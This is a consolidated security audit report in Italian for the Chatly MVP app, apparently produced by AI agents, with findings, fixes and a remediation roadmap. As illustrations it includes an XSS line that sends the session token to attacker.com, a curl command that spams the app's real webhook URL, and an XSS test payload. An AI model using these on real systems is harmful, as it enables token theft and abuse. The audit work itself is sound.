# CHATLY MVP - REPORT CONSOLIDATO AUDIT DI SICUREZZA

**Data**: 2025-12-27
**Project Manager**: Chatly Project Manager Agent
**Branch**: `security-audit-and-improvements`

---

## EXECUTIVE SUMMARY

Questo report consolida i risultati di 4 audit di sicurezza paralleli condotti su Chatly MVP:
1. **Database Security Audit** (Database Engineer)
2. **Backend API Security Audit** (Backend Architect)
3. **Frontend Security Audit** (Frontend React Engineer)
4. **Authentication & Authorization Audit** (Security Vulnerability Analyzer)

### Panoramica dei Risultati

| Categoria | Critico | Alto | Medio | Basso | Totale |
|-----------|---------|------|-------|-------|--------|
| Database | 4 | 6 | 5 | 3 | 18 |
| Backend API | 0 | 3 | 5 | 5 | 13 |
| Frontend | 0 | 3 | 6 | 4 | 13 |
| Auth/Authz | 4 | 5 | 8 | 3 | 20 |
| **TOTALE** | **8** | **17** | **24** | **15** | **64** |

### Valutazione Complessiva della Sicurezza

**Stato Attuale**: 🔴 **NON PRODUCTION-READY**
**Rischio Complessivo**: **ALTO**

**Punti di Forza**:
- ✅ Architettura RLS (Row Level Security) ben progettata
- ✅ Crittografia token OAuth tramite Supabase Vault (design)
- ✅ Flusso PKCE per autenticazione OAuth 2.0
- ✅ Separazione dei layer (Pages → Hooks → Services → Supabase)
- ✅ Security headers configurati in Vercel

**Vulnerabilità Critiche**:
- 🔴 Token OAuth memorizzati in **PLAIN TEXT** nel database (non implementata la crittografia Vault)
- 🔴 Tabelle `documents` e `appointments` **SENZA RLS policies**
- 🔴 Webhook n8n **senza autenticazione** (esposto pubblicamente)
- 🔴 Token di sessione in localStorage (vulnerabile a XSS)
- 🔴 SQL injection risk nelle query di ricerca ILIKE
- 🔴 Mancanza di CSP (Content Security Policy) header

---

## SEZIONE 1: VULNERABILITÀ CRITICHE (8 ISSUE)

### CRITICO-01: Token OAuth in Plain Text nel Database
**Fonte**: Database Engineer
**Impatto**: Compromissione completa degli account WhatsApp/Instagram/Messenger
**CVSS**: 9.8 (Critical)

**Problema**:
La tabella `platform_clients` memorizza i token in plain text:
```sql
-- database/db.sql
whatsapp_token text,
instagram_token text,
messenger_token text,
```

Nonostante il codice `tokenManager.ts` sia progettato per Vault, **le funzioni database non esistono**.

**Impatto**:
- Chiunque acceda al database può rubare tutti i token OAuth
- Backup del database contengono token in chiaro
- Token visibili nei log delle query

**Azione Richiesta**:
1. Creare le funzioni RPC Vault (`store_platform_token`, `get_platform_token`, etc.)
2. Migrare i token esistenti da plain text a Vault
3. Rimuovere le colonne `*_token` dal database
4. Aggiungere colonne `*_token_secret_id UUID`

**Stima Tempo**: 6-8 ore
**Priorità**: 🔴 **IMMEDIATA** (blocca il deploy)

---

### CRITICO-02: Tabella `documents` Senza RLS Policies
**Fonte**: Database Engineer, Security Analyzer
**Impatto**: Utenti possono accedere/eliminare documenti di altri utenti
**CVSS**: 9.0 (Critical)

**Problema**:
La tabella `documents` non ha RLS abilitato:
```sql
-- Nessuna policy trovata in security_fixes.sql
SELECT * FROM documents WHERE platform_client_id = 999; -- Succede!
```

**Impatto**:
- User A può scaricare i documenti confidenziali di User B
- User A può eliminare i documenti di User B
- Storage paths esposti permettono accesso diretto

**Azione Richiesta**:
```sql
ALTER TABLE documents ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Users can view own documents" ON documents
FOR SELECT USING (
  platform_client_id IN (
    SELECT id FROM platform_clients WHERE user_id = auth.uid()
  )
);

CREATE POLICY "Users can insert own documents" ON documents
FOR INSERT WITH CHECK (
  platform_client_id IN (
    SELECT id FROM platform_clients WHERE user_id = auth.uid()
  )
);

CREATE POLICY "Users can delete own documents" ON documents
FOR DELETE USING (
  platform_client_id IN (
    SELECT id FROM platform_clients WHERE user_id = auth.uid()
  )
);
```

**Stima Tempo**: 1 ora
**Priorità**: 🔴 **IMMEDIATA**

---

### CRITICO-03: Tabella `appointments` Senza RLS Policies
**Fonte**: Database Engineer
**Impatto**: Utenti possono vedere/modificare appuntamenti di altri business
**CVSS**: 9.0 (Critical)

**Problema**: Identico a CRITICO-02 ma per la tabella `appointments`.

**Azione Richiesta**:
```sql
ALTER TABLE appointments ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Users can manage own appointments" ON appointments
FOR ALL USING (
  platform_client_id IN (
    SELECT id FROM platform_clients WHERE user_id = auth.uid()
  )
);
```

**Stima Tempo**: 30 minuti
**Priorità**: 🔴 **IMMEDIATA**

---

### CRITICO-04: SQL Injection via ILIKE in Search Queries
**Fonte**: Database Engineer, Backend Architect, Frontend Engineer
**Impatto**: Potenziale SQL injection e performance degradation
**CVSS**: 8.2 (High)

**Problema**:
```typescript
// contactService.ts:246
.or(`display_name.ilike.%${searchQuery}%,name.ilike.%${searchQuery}%`)

// messageService.ts:65
query = query.ilike('content_text', `%${searchQuery}%`)
```

Input utente non sanitizzato prima di essere usato in query ILIKE.

**Azione Richiesta**:
```typescript
import { escapeRegex, sanitizeInput } from '../lib/security-utils'

// Funzione helper per escape ILIKE
function escapeLikePattern(input: string): string {
  return input.replace(/[%_]/g, '\\$&')
}

// Uso
const sanitizedQuery = escapeLikePattern(sanitizeInput(searchQuery, 100))
query = query.ilike('content_text', `%${sanitizedQuery}%`)
```

**Files da modificare**:
- `src/services/contactService.ts` (line 246)
- `src/services/messageService.ts` (line 65)

**Stima Tempo**: 2 ore
**Priorità**: 🔴 **IMMEDIATA**

---

### CRITICO-05: Webhook n8n Senza Autenticazione
**Fonte**: Backend Architect, Security Analyzer
**Impatto**: Chiunque può inviare messaggi via webhook
**CVSS**: 8.2 (Critical)

**Problema**:
```typescript
// messageService.ts:192-194
const webhookUrl = isProduction
  ? 'https://automagruppoitalia.app.n8n.cloud/webhook/human-operator'
  : 'https://automagruppoitalia.app.n8n.cloud/webhook-test/human-operator'

// Nessuna autenticazione!
fetch(webhookUrl, { method: 'POST', body: JSON.stringify(payload) })
```

**Attacco Possibile**:
```bash
curl -X POST https://automagruppoitalia.app.n8n.cloud/webhook/human-operator \
  -H "Content-Type: application/json" \
  -d '{"message":"SPAM","platform":"whatsapp",...}'
```

**Azione Richiesta**:
1. Implementare HMAC signature:
```typescript
import crypto from 'crypto'

const WEBHOOK_SECRET = import.meta.env.VITE_N8N_WEBHOOK_SECRET

function generateHMAC(payload: string): string {
  return crypto
    .createHmac('sha256', WEBHOOK_SECRET)
    .update(payload)
    .digest('hex')
}

const payloadString = JSON.stringify(payload)
const signature = generateHMAC(payloadString)

const response = await fetch(webhookUrl, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Webhook-Signature': signature
  },
  body: payloadString
})
```

2. Configurare n8n per validare la signature

**Stima Tempo**: 4 ore (frontend + n8n workflow)
**Priorità**: 🔴 **IMMEDIATA**

---

### CRITICO-06: Session Token in localStorage (XSS Risk)
**Fonte**: Security Analyzer
**Impatto**: Session hijacking via XSS
**CVSS**: 9.1 (Critical)

**Problema**:
```typescript
// supabase.ts:29
auth: {
  persistSession: true, // Usa localStorage
  storageKey: 'chatly-auth-token'
}
```

Qualsiasi XSS può rubare il token:
```javascript
const token = localStorage.getItem('chatly-auth-token')
fetch('https://attacker.com/steal', { method: 'POST', body: token })
```

**Azione Richiesta** (Post-MVP - richiede refactoring maggiore):
1. **Soluzione ideale**: Implementare httpOnly cookies (richiede Supabase Edge Functions)
2. **Mitigazione temporanea**:
   - Token short-lived (15 minuti)
   - Session timeout su inattività
   - CSP header strict (vedi CRITICO-08)

**Stima Tempo**: 1-2 giorni (implementazione completa httpOnly)
**Priorità**: 🟠 **ALTA** (può essere mitigato con CSP)

---

### CRITICO-07: Vulnerabilità Dependency (esbuild)
**Fonte**: Security Analyzer
**Impatto**: Esposizione source code in development
**CVSS**: 5.3 (Moderate, ma dev environment)

**Problema**:
```json
{
  "vulnerabilities": {
    "esbuild": {
      "severity": "moderate",
      "via": "GHSA-67mh-4wv8-2f99",
      "fixAvailable": { "name": "vite", "version": "7.3.0" }
    }
  }
}
```

**Azione Richiesta**:
```bash
npm install vite@^7.3.0 --save-dev
npm audit fix
```

**Testing richiesto**: Verificare breaking changes in Vite 7.x

**Stima Tempo**: 2-4 ore (upgrade + testing)
**Priorità**: 🟠 **ALTA**

---

### CRITICO-08: Mancanza CSP (Content Security Policy) Header
**Fonte**: Frontend Engineer, Security Analyzer
**Impatto**: Nessuna protezione contro XSS
**CVSS**: 7.5 (High)

**Problema**:
```json
// vercel.json - CSP MANCANTE
{
  "headers": [
    { "key": "X-XSS-Protection", "value": "1; mode=block" }, // Deprecato!
    // Manca Content-Security-Policy
  ]
}
```

**Azione Richiesta**:
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'self' https://*.supabase.co https://automagruppoitalia.app.n8n.cloud; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; frame-ancestors 'none';"
        },
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=31536000; includeSubDomains; preload"
        }
      ]
    }
  ]
}
```

**Nota**: Rimuovere `X-XSS-Protection` (deprecato e può introdurre vulnerabilità)

**Stima Tempo**: 1 ora
**Priorità**: 🔴 **IMMEDIATA**

---

## SEZIONE 2: VULNERABILITÀ ALTA PRIORITÀ (17 ISSUE)

### ALTO-01: Console Logging in Production (50+ istanze)
**Fonte**: Backend Architect, Frontend Engineer
**Impatto**: Information disclosure (dettagli errori, token metadata)
**Files**: `supabase.ts`, `tokenManager.ts`, `AuthContext.tsx`, `ChatArea.tsx`, tutti gli hooks

**Azione**: Wrappare tutti i console.log/error con `if (import.meta.env.DEV)`
**Stima**: 2-3 ore

---

### ALTO-02: IDOR - Nessuna Validazione Ownership Client-Side
**Fonte**: Security Analyzer
**Impatto**: Potenziale accesso a dati di altri utenti (se RLS fallisce)

**Azione**: Aggiungere validazione ownership in tutti i service:
```typescript
async function getCurrentPlatformClientId(): Promise<number | null> {
  const { data: { user } } = await supabase.auth.getUser()
  if (!user) return null

  const { data } = await supabase
    .from('platform_clients')
    .select('id')
    .eq('user_id', user.id)
    .single()

  return data?.id || null
}

export const getConversations = async (filters: ConversationFilters) => {
  const currentClientId = await getCurrentPlatformClientId()

  if (currentClientId !== filters.platformClientId) {
    throw new Error('Unauthorized: Cannot access other users data')
  }
  // ... rest
}
```

**Stima**: 4-6 ore

---

### ALTO-03: JSONB Field Rendering Senza Sanitizzazione
**Fonte**: Frontend Engineer
**Files**: `LeadDetailsPanel.tsx` (lines 225-331)

**Azione**:
```typescript
import { sanitizeHtml } from '../../lib/security-utils'

const formatGoal = (goal: any) => {
  if (typeof item === 'object') {
    const jsonStr = JSON.stringify(item)
    return sanitizeHtml(jsonStr)
  }
  return sanitizeHtml(String(value))
}
```

**Stima**: 1 ora

---

### ALTO-04: Missing Input Validation on Message Sending
**Fonte**: Frontend Engineer
**Files**: `ChatArea.tsx:71-73`

**Azione**: Aggiungere validazione max length e sanitizzazione:
```typescript
const sanitized = sanitizeInput(messageText.trim(), 5000)
if (sanitized.length > 5000) {
  setSendError('Messaggio troppo lungo (max 5000 caratteri)')
  return
}
```

**Stima**: 2 ore

---

### ALTO-05: Timing Attack su Login (User Enumeration)
**Fonte**: Security Analyzer
**Files**: `AuthContext.tsx:88-147`

**Azione**: Implementare constant-time response:
```typescript
const MIN_RESPONSE_TIME = 500 // ms
const startTime = Date.now()

try {
  // Login logic
} finally {
  const elapsed = Date.now() - startTime
  if (elapsed < MIN_RESPONSE_TIME) {
    await new Promise(resolve => setTimeout(resolve, MIN_RESPONSE_TIME - elapsed))
  }
}
```

**Stima**: 2 ore

---

### ALTO-06: Realtime Subscription Authorization Bypass Risk
**Fonte**: Security Analyzer
**Files**: `conversationService.ts:76-129`, `messageService.ts:91-131`

**Azione**: Aggiungere validazione ownership nei callback subscription:
```typescript
.on('postgres_changes', { ... }, async (payload) => {
  // Verificare ownership prima di processare
  if (payload.new.platform_client_id !== platformClientId) {
    console.error('[SECURITY] Unauthorized realtime event')
    return
  }
  // ... process
})
```

**Stima**: 3 ore

---

### ALTO-07: Missing Storage Bucket Policies
**Fonte**: Database Engineer

**Azione**: Configurare Storage policies via Supabase Dashboard:
```sql
-- Policy: Users can upload only to their own folder
CREATE POLICY "Users can upload own documents"
ON storage.objects FOR INSERT
TO authenticated
WITH CHECK (
  bucket_id = 'documents' AND
  (storage.foldername(name))[1] = (
    SELECT id::text FROM platform_clients WHERE user_id = auth.uid()
  )
);
```

**Stima**: 1 ora

---

### ALTO-08: Missing Vault RPC Functions
**Fonte**: Database Engineer

**Azione**: Implementare tutte le funzioni Vault (vedi CRITICO-01)
**Stima**: Incluso in CRITICO-01

---

### ALTO-09: Weak Foreign Key Cascade Rules
**Fonte**: Database Engineer

**Azione**: Aggiungere ON DELETE CASCADE espliciti:
```sql
ALTER TABLE appointments
  DROP CONSTRAINT appointments_platform_client_id_fkey,
  ADD CONSTRAINT appointments_platform_client_id_fkey
    FOREIGN KEY (platform_client_id)
    REFERENCES platform_clients(id)
    ON DELETE CASCADE;
```

**Stima**: 2 ore

---

### ALTO-10: Missing RLS Performance Indexes
**Fonte**: Database Engineer

**Azione**: Creare indici per RLS policy lookups:
```sql
CREATE INDEX IF NOT EXISTS idx_platform_clients_user_id
  ON platform_clients(user_id);

CREATE INDEX IF NOT EXISTS idx_conversations_platform_client_id
  ON conversations(platform_client_id);

CREATE INDEX IF NOT EXISTS idx_messages_conversation_id
  ON messages(conversation_id);
```

**Stima**: 1 ora

---

### ALTO-11-17: Altri Issue Alta Priorità

- **ALTO-11**: Missing form validation in LeadDetailsPanel (2 ore)
- **ALTO-12**: No rate limiting on document upload (2 ore)
- **ALTO-13**: Hardcoded webhook URLs (1 ora - move to env vars)
- **ALTO-14**: Session hijacking - no token rotation (3 ore)
- **ALTO-15**: Missing input validation in service layer (4 ore)
- **ALTO-16**: No webhook signature verification (4 ore - overlap con CRITICO-05)
- **ALTO-17**: Realtime filter injection risk (2 ore)

---

## SEZIONE 3: RIEPILOGO SFORZO IMPLEMENTAZIONE

### Fase 1: CRITICI (Blocca Deploy) - 1-2 Settimane
| Issue | Stima | Agente Assegnato |
|-------|-------|------------------|
| CRITICO-01: Token in plain text → Vault | 6-8h | Database Engineer |
| CRITICO-02: Documents RLS | 1h | Database Engineer |
| CRITICO-03: Appointments RLS | 30m | Database Engineer |
| CRITICO-04: SQL Injection ILIKE | 2h | Backend Architect |
| CRITICO-05: Webhook auth | 4h | Backend Architect |
| CRITICO-06: localStorage XSS (mitigazione) | 2h | Frontend Engineer |
| CRITICO-07: Vite upgrade | 2-4h | Frontend Engineer |
| CRITICO-08: CSP header | 1h | Backend Architect |
| **TOTALE FASE 1** | **~19-22 ore** | **Multi-agent** |

### Fase 2: ALTA PRIORITÀ - 2-3 Settimane
| Categoria | Stima | Agente |
|-----------|-------|--------|
| Console logging cleanup | 3h | Multi-agent |
| IDOR validation | 6h | Backend Architect |
| Input validation/sanitization | 8h | Frontend Engineer |
| Timing attacks | 2h | Backend Architect |
| Realtime auth | 3h | Backend Architect |
| Storage policies | 1h | Database Engineer |
| Indexes & cascade rules | 3h | Database Engineer |
| **TOTALE FASE 2** | **~26 ore** | **Multi-agent** |

### Fase 3: MEDIA PRIORITÀ (Post-MVP) - 1-2 Mesi
- Password policy configuration
- Account lockout mechanism
- Session activity logging
- Rate limiting
- CSRF token validation
- Audit logging
- **TOTALE FASE 3**: ~40 ore

### Fase 4: BASSA PRIORITÀ - 3-6 Mesi
- API caching
- Structured logging
- Security monitoring
- OAuth token rotation schedule
- **TOTALE FASE 4**: ~20 ore

---

## SEZIONE 4: ROADMAP PRIORITIZZATA

### Week 1: CRITICAL FIXES (BLOCCO DEPLOY)
**Obiettivo**: Eliminare vulnerabilità critiche che impediscono il deploy

**Giorno 1-2**: Database Security
- [ ] Implementare funzioni Vault RPC (6-8h)
- [ ] Migrare token esistenti da plain text a Vault
- [ ] Aggiungere RLS su `documents` e `appointments` (1.5h)
- [ ] Creare migration files

**Giorno 3**: Backend Security
- [ ] Sanitizzare query ILIKE (2h)
- [ ] Implementare HMAC webhook authentication (4h)
- [ ] Aggiungere CSP header in vercel.json (1h)

**Giorno 4-5**: Frontend & Testing
- [ ] Upgrade Vite 7.x (2-4h)
- [ ] Testing regressione post-upgrade
- [ ] Verificare RLS policies con test IDOR
- [ ] Cleanup console.log in file critici (2h)

**Deliverable Week 1**:
- ✅ 8 vulnerabilità CRITICHE risolte
- ✅ Branch `security-critical-fixes` merged in `security-audit-and-improvements`
- ✅ Test report di validazione

---

### Week 2-3: HIGH PRIORITY FIXES
**Obiettivo**: Implementare defense-in-depth e hardening

**Week 2**:
- [ ] IDOR validation in tutti i services (6h)
- [ ] Input validation completa (8h)
- [ ] Timing attack mitigation (2h)
- [ ] Realtime subscription auth (3h)
- [ ] Storage bucket policies (1h)

**Week 3**:
- [ ] Performance indexes per RLS (1h)
- [ ] Foreign key cascade rules (2h)
- [ ] Form validation in LeadDetailsPanel (2h)
- [ ] Rate limiting document upload (2h)
- [ ] Session timeout implementation (2h)

**Deliverable Week 2-3**:
- ✅ 17 vulnerabilità ALTE risolte
- ✅ Branch `security-high-priority-fixes` merged
- ✅ Test suite di sicurezza eseguita

---

### Week 4: CODE QUALITY REVIEW & TESTING
**Obiettivo**: Validare implementazione e qualità del codice

**Attività**:
- [ ] Code quality review (agent: code-quality-reviewer)
- [ ] Security testing completo
- [ ] Performance testing
- [ ] Penetration testing manuale
- [ ] Documentazione aggiornata

**Deliverable Week 4**:
- ✅ Code quality report
- ✅ Security test results
- ✅ Branch `security-audit-and-improvements` pronto per merge in `main`

---

### Month 2-3: MEDIUM PRIORITY (Post-MVP)
- Password policy hardening
- Account lockout
- Comprehensive audit logging
- Rate limiting API-wide
- CSRF hardening

---

### Month 4-6: LOW PRIORITY (Maintenance)
- Security monitoring setup
- Structured logging
- Token rotation automation
- Security scanning in CI/CD

---

## SEZIONE 5: DECISION MATRIX

### CRITICO-06: localStorage vs httpOnly Cookies
**Decisione**: Mantenere localStorage per MVP, mitigare con CSP strict

**Rationale**:
- httpOnly cookies richiedono Supabase Edge Functions (1-2 settimane dev)
- CSP header + session timeout forniscono mitigazione accettabile per MVP
- Piano post-MVP: Implementare httpOnly cookies in Q1 2026

**Approval Required**: Product Owner

---

### CRITICO-05: Webhook Authentication
**Decisione**: Implementare HMAC signature

**Rationale**:
- Costo implementazione: 4 ore (accettabile)
- Rischio mitigato: Spam e message injection
- Richiede coordinamento con n8n workflow

**Approval Required**: Backend Lead

---

## SEZIONE 6: RISK REGISTER

| Risk ID | Descrizione | Probabilità | Impatto | Mitigazione |
|---------|-------------|-------------|---------|-------------|
| R-01 | RLS policies bypassate | Media | Critico | Testing automatizzato RLS |
| R-02 | XSS via JSONB fields | Bassa | Alto | Sanitizzazione + CSP |
| R-03 | Session hijacking | Media | Alto | Session timeout + CSP |
| R-04 | Webhook spam | Alta | Medio | HMAC signature |
| R-05 | IDOR via manipolazione ID | Bassa | Alto | Ownership validation |
| R-06 | Dependency vulnerabilities | Continua | Variabile | npm audit in CI/CD |

---

## SEZIONE 7: QUALITY GATES

### Gate 1: Pre-Merge Checklist (Critici)
- [ ] Tutti i token OAuth in Vault (non plain text)
- [ ] RLS abilitato su tutte le tabelle user-facing
- [ ] Webhook n8n con HMAC signature
- [ ] CSP header configurato
- [ ] SQL injection ILIKE risolto
- [ ] Vite aggiornato (no vulnerabilità npm audit)

### Gate 2: Pre-Production Checklist (Alti)
- [ ] IDOR validation implementata
- [ ] Console.log cleanup in production
- [ ] Input validation completa
- [ ] Storage policies configurate
- [ ] Realtime auth validation
- [ ] Performance indexes creati

### Gate 3: Post-MVP Checklist (Medi)
- [ ] Audit logging attivo
- [ ] Password policy configurata
- [ ] Account lockout implementato
- [ ] Rate limiting API-wide
- [ ] Security monitoring setup

---

## SEZIONE 8: TEST PLAN

### Security Test Scenarios

#### Scenario 1: RLS Bypass Test
```typescript
// Test: User A non può accedere a dati di User B
describe('RLS Policy Tests', () => {
  it('should prevent cross-tenant conversation access', async () => {
    const userA = await loginAs('userA@example.com')
    const userBConversationId = 999

    const { data, error } = await supabase
      .from('conversations')
      .select('*')
      .eq('id', userBConversationId)

    expect(data).toBeNull() // RLS deve bloccare
  })
})
```

#### Scenario 2: IDOR Test
```typescript
// Test: Tentativo di eliminare documento di altro utente
it('should prevent IDOR on document deletion', async () => {
  const userA = await loginAs('userA@example.com')
  const userBDocId = 456

  await expect(deleteDocument(userBDocId)).rejects.toThrow('Unauthorized')
})
```

#### Scenario 3: XSS Test
```typescript
// Test: XSS payload in message content
it('should sanitize XSS in messages', async () => {
  const xssPayload = '<script>alert("XSS")</script>'
  await sendMessage(xssPayload, conversationId)

  const messages = await getMessages(conversationId)
  expect(messages[0].content_text).not.toContain('<script>')
})
```

#### Scenario 4: Timing Attack Test
```typescript
// Test: Login timing costante
it('should have constant-time login response', async () => {
  const times = []

  for (let i = 0; i < 50; i++) {
    const start = Date.now()
    try { await login('test@example.com', 'wrong') } catch {}
    times.push(Date.now() - start)
  }

  const mean = times.reduce((a, b) => a + b) / times.length
  const stdDev = Math.sqrt(times.map(t => (t - mean) ** 2).reduce((a, b) => a + b) / times.length)

  expect(stdDev).toBeLessThan(100) // Bassa varianza
})
```

---

## SEZIONE 9: RISORSE E ASSEGNAZIONI

### Database Engineer
**Responsabilità**:
- Implementazione funzioni Vault RPC
- Migrazione token a Vault
- RLS policies per documents/appointments
- Storage bucket policies
- Performance indexes
- Foreign key cascade rules

**Stima Totale**: ~20 ore

---

### Backend Architect
**Responsabilità**:
- SQL injection ILIKE fix
- HMAC webhook authentication
- CSP header configuration
- IDOR ownership validation
- Timing attack mitigation
- Realtime subscription auth
- Input validation service layer

**Stima Totale**: ~25 ore

---

### Frontend React Engineer
**Responsabilità**:
- Vite upgrade 7.x
- Console.log cleanup
- JSONB sanitization
- Message input validation
- Form validation
- Session timeout UI
- Rate limiting UI

**Stima Totale**: ~18 ore

---

### Security Vulnerability Analyzer
**Responsabilità**:
- Security testing
- Penetration testing
- Test scenario execution
- Vulnerability verification
- Final security sign-off

**Stima Totale**: ~12 ore

---

### Code Quality Reviewer
**Responsabilità**:
- Code quality assessment post-fixes
- Architecture adherence verification
- Best practices validation
- Documentation review

**Stima Totale**: ~8 ore

---

## SEZIONE 10: SUCCESS METRICS

### Security KPIs
- ✅ **0 vulnerabilità CRITICHE** (target: 100%)
- ✅ **0 vulnerabilità ALTE** (target: 100%)
- ✅ **<5 vulnerabilità MEDIE** (target: post-MVP)
- ✅ **npm audit: 0 high/critical** (target: 100%)
- ✅ **RLS policies: 100% coverage** (target: 100%)
- ✅ **Test coverage: >80%** per security tests

### Quality KPIs
- ✅ **Code quality score: A** (target: A/B)
- ✅ **TypeScript strict mode: enabled** (target: 100%)
- ✅ **ESLint errors: 0** (target: 0)
- ✅ **Architecture adherence: 100%** (layered pattern)

---

## SEZIONE 11: COMUNICAZIONE E REPORTING

### Daily Standups
**Frequenza**: Daily durante implementazione
**Partecipanti**: Tutti gli agenti + Project Manager
**Formato**:
- Cosa è stato completato ieri
- Cosa verrà fatto oggi
- Blockers/dependencies

### Weekly Status Report
**Destinatari**: Product Owner, Tech Lead
**Contenuto**:
- Vulnerabilità risolte (count per severity)
- Test passed/failed
- Risk register updates
- Blockers escalation

### Final Security Report
**Delivery**: Fine Week 4
**Contenuto**:
- Executive summary
- Vulnerabilità risolte
- Test results
- Raccomandazioni post-MVP
- Production readiness sign-off

---

## SEZIONE 12: PROSSIMI PASSI

### Immediate Actions (Oggi)
1. ✅ Branch `security-audit-and-improvements` creato
2. ✅ Report audit consolidato completato
3. ⏭️ **Presentare roadmap a Product Owner per approval**
4. ⏭️ Creare sub-branches per fase (critical, high-priority)
5. ⏭️ Kickoff meeting con tutti gli agenti

### Week 1 Kickoff
- [ ] Database Engineer: Inizio implementazione Vault functions
- [ ] Backend Architect: SQL injection fixes
- [ ] Frontend Engineer: Vite upgrade
- [ ] Security Analyzer: Setup test environment

---

## CONCLUSIONI

Chatly MVP ha una **solida architettura di sicurezza** ma **lacune critiche nell'implementazione**. Le vulnerabilità identificate sono **risolvibili in 3-4 settimane** con coordinamento multi-agent.

**Raccomandazione Finale**: 🔴 **NON DEPLOYARE** fino a risoluzione di tutti i CRITICI e ALTI.

**Timeline Ottimistica**: Production-ready in 4 settimane
**Timeline Realistica**: Production-ready in 5-6 settimane (con buffer testing)

**Approval Points**:
- [ ] Product Owner approva roadmap
- [ ] Tech Lead approva stime effort
- [ ] Security Lead approva test plan

---

**Fine Report Consolidato**

---

**Prossimo Step**: Attendere approval per procedere con Fase 1 (CRITICI)